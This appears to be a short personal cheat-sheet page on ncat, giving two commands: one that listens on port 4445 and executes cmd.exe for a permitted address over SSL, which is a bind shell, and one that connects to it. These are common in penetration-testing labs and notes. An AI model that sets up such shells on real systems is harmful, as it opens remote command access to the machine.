<title>ncat</title>
</head><body>## Listen on port 4445 and execute cmd.exe allow 10.11.0.183 to connect<br/>
ncat -lvp 4445 -e cmd.exe --allow 10.11.0.183 --ssl<br/>
<br/>
## Start a connection on 4445<br/>
ncat -v 10.11.11.125 4445</body></html>
